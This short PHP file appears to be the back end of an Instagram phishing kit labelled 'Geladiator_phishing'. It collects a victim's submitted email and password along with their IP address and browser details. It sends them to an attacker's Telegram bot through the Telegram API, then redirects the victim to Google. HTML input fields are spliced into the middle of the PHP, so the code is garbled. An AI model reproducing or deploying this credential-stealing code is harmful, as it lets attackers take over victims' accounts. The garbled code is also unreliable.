<?php
$message .= "🚦🎗 INSTAGRAM Account  🎗🚦" ."\n";
$message .= "🔹 email: ".$_POST['username2']."\n";
$message .= "🔹 password: ".$_POST['PASSWORD']."\n";
$message .= "🔸 IP : ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "🔸 PHONE / PC: ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "➖ Geladiator_phishing Geladiator_phishing";



		        <input name="ID" maxlength="10" id="id" type="tel" placeholder="ID number"required>
	        <input name="TOKEN" maxlength="60" id="token" class="margin-top-lb-30 margin-top-sb-30" type="text" placeholder="TOKEN" required>



$send = file_get_contents("https://api.telegram.org/bot$TOKEN/SendMessage?chat_id=$ID&text=".urlencode($message));
include('assets/css1.php');
?>
<meta content='0;url=www.google.com<?php ?>' http-equiv='refresh'/>